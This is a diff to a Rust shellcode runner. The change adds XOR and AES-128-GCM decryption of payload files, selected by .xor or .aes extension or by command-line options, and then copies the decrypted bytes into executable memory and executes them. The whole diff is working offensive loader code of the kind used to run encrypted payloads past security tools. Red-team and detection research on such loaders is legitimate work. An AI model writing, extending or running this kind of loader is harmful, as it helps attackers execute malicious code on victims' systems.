@@ -3,15 +3,22 @@ use libc;
 use lib::crypt;
 use clap::{Parser};
 use lib::config::Config;
+use lib::crypt::Algo;
+use lib::crypt::Key;
+mod key_parser;
 
 #[derive(Parser)]
 struct Args {
     /// File to execute
     file: String,
 
-    /// Choose key to decrypt
+    /// Choose algorithm used to decrypt to override filename parsing
+    #[arg(short, long, value_name = "ALGORITHM")]
+    algo: Option<Algo>,
+
+    /// Choose key to decrypt to override .key file usage
     #[arg(short, long, value_name = "KEY")]
-    decrypt: Option<String>,
+    key: Option<String>,
 
     /// verbose mode
     #[arg(short, long)]
@@ -64,28 +71,43 @@ fn free_mem(mem: *mut libc::c_void, size: usize, config: &Config) {
     }
 }
 
+fn decrypt_shellcode(shellcode: &mut Vec<u8>, file: &str, algo: Option<Algo>, key: Option<String>, config: &Config) {
+    config.log("Checking if file needs decrypting...");
+    let needs_decrypt = algo.is_some()
+        || file.ends_with(".xor")
+        || file.ends_with(".aes");
+
+    if !needs_decrypt { return; }
+
+    config.log("File needs to be decrypted");
+    let (_, key) = key_parser::key_parser::resolve_encryption(file, algo, key, config)
+        .unwrap_or_else(|e| { eprintln!("{}", e); std::process::exit(1); });
+
+    match &key {
+        Key::Xor(k) => config.log(&format!("Decrypting with XOR key 0x{:02X}...", k)),
+        Key::Aes(_)  => config.log("Decrypting with AES-128-GCM..."),
+    }
+
+    crypt::create_cipher(&key).decrypt(shellcode);
+}
+
+fn run_shellcode(shellcode: &[u8], config: &Config) {
+    let size = shellcode.len();
+    let mem = alloc_executable_memory(size, config);
+    copy_to_mem(shellcode, mem, config);
+    exec(mem, config);
+    free_mem(mem, size, config);
+}
+
 fn main() {
     let args = Args::parse();
-    let mut config = Config::new(args.verbose, None);
+    let config = Config::new(args.verbose);
+
     config.log("Starting shellcode runner...");
-    let mut shellcode: Vec<u8> = read_shellcode(&args.file, &config);
-    if let Some(key_str) = args.decrypt {
-        config.key = crypt::parse_hex(&key_str).ok();
-        config.log(&format!("Decrypting with key: 0x{}...", key_str));
-        if let Some(key) = config.key {
-            crypt::xor_crypt(&mut shellcode, key);
-            config.log(&format!("Decrypted with key 0x{:02X}", key));
-        } else {
-            config.log("Invalid hex key");
-            eprintln!("Error: Invalid hexcode");
-            std::process::exit(1);
-        }
-    }
-    let size: usize = shellcode.len();
-    config.log(&format!("Shellcode size: {} bytes", size));
-    let mem: *mut libc::c_void = alloc_executable_memory(size, &config);
-    copy_to_mem(&shellcode, mem, &config);
-    exec(mem, &config);
-    free_mem(mem, size, &config);
+
+    let mut shellcode = read_shellcode(&args.file, &config);
+    decrypt_shellcode(&mut shellcode, &args.file, args.algo, args.key, &config);
+    run_shellcode(&shellcode, &config);
+
     config.log("Done!");
 }
